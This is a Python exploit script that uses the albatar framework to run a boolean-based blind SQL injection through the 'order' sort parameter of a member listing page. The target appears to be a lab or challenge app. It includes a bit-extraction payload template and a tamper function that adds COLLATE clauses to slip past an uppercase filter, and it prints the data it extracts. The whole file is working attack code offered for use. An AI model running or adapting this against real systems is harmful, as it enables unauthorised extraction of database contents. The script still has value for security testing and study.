from albatar import * # https://github.com/lanjelot/albatar
import re

PROXIES = {}#'http': 'http://127.0.0.1:8008', 'https': 'http://127.0.0.1:8008'}
HEADERS = ['User-Agent: Mozilla/5.0']

def test_state(headers, body, time):
  return '''email<br/>\n2 asmith''' in body

def bypass_strtoupper(s):
  def add_collate(m):
    return '%s COLLATE utf8_general_ci = %s' % m.groups()

  return re.sub('(\S+)\s*=\s*("[a-z0-9_-]+")', add_collate, s, flags=re.I)

def mysql_boolean():
  template = "asc,case when (ascii(mid((${query}),${char_pos},1))&${bit_mask})=${bit_mask} then first_name else last_name end asc"

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = "http://app/member/?sort=last_name&order=${injection}", # or use localhost:8080 to test from the host
      method = 'GET',
      response_processor = test_state,
      tamper_payload = bypass_strtoupper,
      )

  return Method_bitwise(make_requester, template)

sqli = MySQL_Blind(mysql_boolean())

for r in sqli.exploit():
  print(r)

# vim: ts=2 sw=2 sts=2 et
